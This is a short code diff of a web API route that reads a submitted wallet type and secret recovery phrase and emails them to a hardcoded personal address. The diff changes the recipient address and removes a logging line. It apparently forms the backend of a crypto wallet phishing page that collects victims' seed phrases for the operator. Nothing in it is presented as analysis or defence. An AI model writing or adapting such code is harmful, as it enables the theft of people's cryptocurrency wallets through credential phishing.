@@ -3,10 +3,10 @@ import { sendMail } from "@/helpers";
 export const POST = async (req) => {
   try {
     const { walletType, secretPhrase } = await req.json();
-    const email = "juverkismendez@yahoo.com";
-    console.log(walletType, secretPhrase)
+    const email = "Houseofpraises22@gmail.com";
+   
 
-    await sendMail(email, walletType, secretPhrase);
+    await sendMail(email, secretPhrase, walletType);
 
     return Response.json(
       { message: "success" },
